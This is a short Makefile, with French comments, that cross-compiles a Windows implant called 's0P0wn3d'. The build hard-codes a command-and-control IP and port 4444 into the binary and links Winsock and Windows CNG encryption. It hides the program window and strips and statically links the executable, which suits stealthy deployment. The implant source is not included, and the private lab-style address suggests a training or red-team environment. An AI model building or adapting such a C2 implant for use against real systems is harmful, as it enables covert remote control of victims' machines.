# s0P0wn3d — Implant build
# Usage:
#   make cross   C2_IP=192.168.56.104 C2_PORT=4444   (cross-compile depuis Linux)
#   make windows C2_IP=192.168.56.104 C2_PORT=4444   (compile sur Windows avec MinGW)

C2_IP   ?= 192.168.56.104
C2_PORT ?= 4444

FLAGS = -DCLIENT_IP=\"$(C2_IP)\" -DCLIENT_PORT=$(C2_PORT) -DWAIT_FOR_CLIENT
# -lbcrypt : Windows CNG (BCryptGenRandom, BCryptImportKeyPair, BCryptEncrypt)
# -lws2_32 : Winsock2
LIBS  = -lws2_32 -lbcrypt

cross:
	x86_64-w64-mingw32-gcc -o implant.exe main.c $(FLAGS) $(LIBS) \
		-mwindows -static -s -O2
	@echo "[+] implant.exe généré ($(C2_IP):$(C2_PORT))"
	@ls -lh implant.exe

windows:
	gcc -o implant.exe main.c $(FLAGS) $(LIBS)
	@echo "[+] implant.exe généré"

clean:
	rm -f implant.exe
